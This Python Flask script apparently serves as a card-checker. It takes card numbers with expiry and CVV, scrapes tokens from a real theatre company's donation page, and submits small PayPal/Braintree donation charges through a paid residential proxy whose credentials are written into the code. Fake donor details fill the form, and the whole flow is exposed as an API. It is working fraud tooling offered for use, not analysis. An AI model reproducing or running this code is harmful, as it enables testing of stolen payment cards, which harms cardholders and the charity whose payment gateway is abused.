import requests
import base64
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

# QUANTUM PROXY SETUP
PROXY_CONFIG = {
    'http': 'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10000',
    'https': 'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10000'
}

def parse_card_from_url(card_url):
    """URL se card data parse karta hai format: /cc=4019240180491527|01|29|078"""
    try:
        if 'cc=' in card_url:
            card_data = card_url.split('cc=')[1].split('&')[0]
            number, month, year, cvv = card_data.split('|')
            return number, f"20{year}-{month}", cvv
    except:
        return None, None, None

def process_payment_flow(card_number, card_expiry, card_cvv):
    """Complete payment processing flow"""
    session = requests.session()
    
    headers = {
        'authority': 'atlanticcitytheatrecompany.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    # PROXY KE SAATH INITIAL REQUEST
    response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', 
                          headers=headers, proxies=PROXY_CONFIG)

    prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
    prefix = prefix_match.group(1) if prefix_match else None

    id_match = re.search(r'give-form-id" value="([^"]+)"', response.text)
    id = id_match.group(1) if id_match else None

    hash_match = re.search(r'give-form-hash" value="([^"]+)"', response.text)
    hash = hash_match.group(1) if hash_match else None

    enc_token_match = re.search(r"data-client-token\":\"(.*?)\"", response.text)
    if enc_token_match:
        enc = enc_token_match.group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
        acc = acc_match.group(1) if acc_match else None
    else:
        acc = None

    if not all([prefix, id, hash, acc]):
        return {'error': 'Failed to extract required tokens'}

    # PAYMENT REQUEST
    headers = {
        'authority': 'atlanticcitytheatrecompany.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryrkHdX8VpEbOzBP7v',
        'origin': 'https://atlanticcitytheatrecompany.com',
        'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    params = {'action': 'give_paypal_commerce_create_order'}

    files = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, prefix),
        'give-form-id': (None, id),
        'give-form-title': (None, ''),
        'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
        'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
        'give-form-minimum': (None, '5.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, hash),
        'give-price-id': (None, 'custom'),
        'give-amount': (None, '5.00'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Assassin '),
        'give_last': (None, 'Op'),
        'give_email': (None, 'assassinopbolte@gmail.com'),
        'give_comment': (None, ''),
        'card_name': (None, 'Assassin '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'billing_country': (None, 'US'),
        'card_address': (None, 'Ny'),
        'card_address_2': (None, ''),
        'card_city': (None, 'New york '),
        'card_state': (None, 'NY'),
        'card_zip': (None, '10080'),
        'give_agree_to_terms': (None, '1'),
        'give-gateway': (None, 'paypal-commerce'),
    }

    response = session.post(
        'https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        files=files,
        proxies=PROXY_CONFIG
    )

    # PAYPAL CONFIRMATION REQUEST
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {acc}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': 'bb55c14f11aba72aaeb78ce1c2fab885',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'payment_source': {
            'card': {
                'number': card_number,
                'expiry': card_expiry,
                'security_code': card_cvv,
                'attributes': {
                    'verification': {'method': 'SCA_WHEN_REQUIRED'},
                },
            },
        },
        'application_context': {'vault': False},
    }

    response = session.post(
        'https://cors.api.paypal.com/v2/checkout/orders/8B515934GC0616145/confirm-payment-source',
        headers=headers,
        json=json_data,
        proxies=PROXY_CONFIG
    )

    return response.json()

# API ENDPOINTS
@app.route('/process-payment', methods=['POST'])
def api_process_payment():
    """Main payment processing endpoint"""
    try:
        data = request.json
        card_url = data.get('card_url')
        
        if not card_url:
            return jsonify({'error': 'card_url parameter required'}), 400
        
        # Card data parse karo URL se
        card_number, card_expiry, card_cvv = parse_card_from_url(card_url)
        
        if not card_number:
            return jsonify({'error': 'Invalid card URL format. Use: /cc=4019240180491527|01|29|078'}), 400
        
        # Payment process karo
        result = process_payment_flow(card_number, card_expiry, card_cvv)
        
        return jsonify({
            'status': 'success',
            'card_data': {
                'number': card_number[:6] + '******' + card_number[-4:],
                'expiry': card_expiry,
                'cvv': '***'
            },
            'payment_result': result
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'active', 'service': 'Payment Processor API'})

@app.route('/proxy-test', methods=['GET'])
def proxy_test():
    """Test Quantum proxy connectivity"""
    try:
        session = requests.session()
        response = session.get('https://httpbin.org/ip', proxies=PROXY_CONFIG, timeout=10)
        return jsonify({
            'status': 'proxy_working',
            'your_ip': response.json().get('origin')
        })
    except Exception as e:
        return jsonify({'error': f'Proxy test failed: {str(e)}'}), 500

# STANDALONE EXECUTION (API ke bina)
if __name__ == '__main__':
    # Agar direct run karna ho without API
    if len(sys.argv) > 1 and sys.argv[1] == 'direct':
        card_url = "/cc=4019240180491527|01|29|078"  # Example
        card_number, card_expiry, card_cvv = parse_card_from_url(card_url)
        
        if card_number:
            print("🚀 Processing payment...")
            result = process_payment_flow(card_number, card_expiry, card_cvv)
            print("📦 Result:", result)
        else:
            print("❌ Invalid card URL format")
    else:
        # API server start karo
        print("🚀 Payment Processor API Starting...")
        print("📍 Endpoints:")
        print("   POST /process-payment")
        print("   GET  /health") 
        print("   GET  /proxy-test")
        print("🔒 Quantum Proxy: ACTIVE")
        app.run(host='0.0.0.0', port=5000, debug=False)
